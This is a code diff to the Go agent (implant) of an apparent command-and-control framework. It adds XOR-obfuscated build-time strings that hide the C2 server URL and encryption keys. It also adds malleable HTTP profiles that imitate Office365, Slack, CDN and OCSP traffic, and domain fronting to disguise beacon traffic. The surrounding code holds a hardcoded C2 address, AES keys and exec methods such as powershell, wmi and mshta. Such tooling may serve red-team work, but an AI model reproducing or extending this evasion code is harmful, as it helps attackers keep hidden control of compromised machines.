@@ -7,6 +7,9 @@ import (
 	"os"
 	"strconv"
 	"time"
+
+	"github.com/mjopsec/taburtuaiC2/pkg/profiles"
+	"github.com/mjopsec/taburtuaiC2/pkg/strenc"
 )
 
 // Build-time variables — overridden by -ldflags during payload generation
@@ -14,6 +17,14 @@ var (
 	serverURL    = "http://192.168.10.102:8080"
 	encKey       = "SpookyOrcaC2AES1"
 	secondaryKey = "TaburtuaiSecondary"
+
+	// Encrypted variants — set by agent-win-encrypted Makefile target.
+	// When non-empty, init() decrypts these and overwrites the plaintext vars above.
+	// xorKeyHex is a 2-char hex byte (e.g. "5a"). All three must be set together.
+	serverURLEnc  = ""
+	encKeyEnc     = ""
+	secKeyEnc     = ""
+	xorKeyHex     = ""
 
 	// Beacon timing
 	defaultInterval = "30"  // seconds
@@ -35,9 +46,41 @@ var (
 	// Values: direct | cmd | powershell | wmi | mshta
 	defaultExecMethod = "cmd"
 
+	// Malleable HTTP profile — controls URIs, headers, and User-Agent pool.
+	// Values: default | office365 | cdn | jquery | slack | ocsp
+	defaultProfile = "default"
+
+	// Domain fronting — if set, the HTTP Host header is overridden with this
+	// value while the TCP connection still goes to ServerURL (the CDN front).
+	// Example: FRONT_DOMAIN=c2-backend.yourdomain.com
+	//          C2_SERVER=https://your-cdn-worker.workers.dev
+	defaultFrontDomain = ""
+
 	// Debug mode — keeps console open on exit (Windows)
 	debugMode = "false"
 )
+
+// init decrypts build-time-encrypted strings before main() runs.
+// Only active when the agent-win-encrypted Makefile target is used.
+func init() {
+	if xorKeyHex == "" || serverURLEnc == "" {
+		return
+	}
+	keyVal, err := strconv.ParseUint(xorKeyHex, 16, 8)
+	if err != nil {
+		return
+	}
+	key := byte(keyVal)
+	if dec := strenc.Dec(serverURLEnc, key); dec != "" {
+		serverURL = dec
+	}
+	if dec := strenc.Dec(encKeyEnc, key); dec != "" {
+		encKey = dec
+	}
+	if dec := strenc.Dec(secKeyEnc, key); dec != "" {
+		secondaryKey = dec
+	}
+}
 
 func main() {
 	// Pre-initialise the Windows console subsystem so the very first subprocess
@@ -78,6 +121,8 @@ func main() {
 		SleepMasking:      defaultSleepMasking == "true",
 		UserAgentRotation: defaultUserAgentRotation == "true",
 		ExecMethod:        defaultExecMethod,
+		Profile:           profiles.Get(defaultProfile),
+		FrontDomain:       defaultFrontDomain,
 	}
 
 	agent, err := NewAgent(cfg)
